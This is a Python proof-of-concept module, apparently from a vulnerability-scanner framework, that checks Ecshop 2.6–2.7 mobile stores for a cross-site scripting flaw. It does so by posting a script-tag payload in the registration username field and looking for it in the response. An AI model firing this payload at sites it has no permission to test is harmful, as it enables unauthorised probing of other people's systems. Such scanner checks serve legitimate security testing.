# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Ecshop_0011'  # 平台漏洞编号，留空
    name = 'Ecshop XSS'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2013-10-30'  # 漏洞公布时间
    desc = '''
        Ecshop xss漏洞,2.6-2.7（开启手机商城的）.
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Ecshop'  # 漏洞应用名称
    product_version = '2.6-2.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fde03a9a-d059-43dd-9fdb-23e3aba510a7'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/mobile/user.php?act=act_register'
            url = '{target}'.format(target=self.target)+payload
            post_data = 'username=networks<script>alert(123456)</script>&email=xsstest@126.com&password=woaini&confirm_password=woaini&act=act_register&back_act='
            req = requests.post(url, data=post_data)
            body = req.text
            if req.status_code == 200:
                if body and body.find('<script>alert(123456)</script>') != -1:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
